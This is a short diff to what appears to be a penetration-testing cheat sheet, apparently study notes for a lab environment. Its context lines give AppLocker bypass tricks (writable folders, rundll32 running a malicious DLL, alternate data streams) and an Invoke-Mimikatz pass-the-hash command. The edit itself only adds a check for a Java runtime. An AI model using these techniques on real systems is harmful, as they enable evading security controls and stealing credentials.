@@ -282,7 +282,7 @@ Includes web services (not just port 80)
 - If default Applocker rules are applied, this means you can bypass by copying bins into `C:\Windows\Temp\` and similar writable folders for to execute.
 - You can also use native bins such as `rundll` to get code exec: `rundll32 myevil.dll,pwnFunction`
 - Use an alternate data stream: `C:\path\to\writable\file.log:evil.js`
-- Check if there's a 3rd party scripting engine such as python
+- Check if there's a 3rd party scripting engine such as python or if JRE for java is on there
 
 ## Mimikatz
 You can wrap these in for ex. `PS> Invoke-Mimikatz -Command '"sekurlsa::pth /user:lemons /domain:dollarcorp.moneycorp.local /ntlm:NThashHERE /run:powershell.exe`
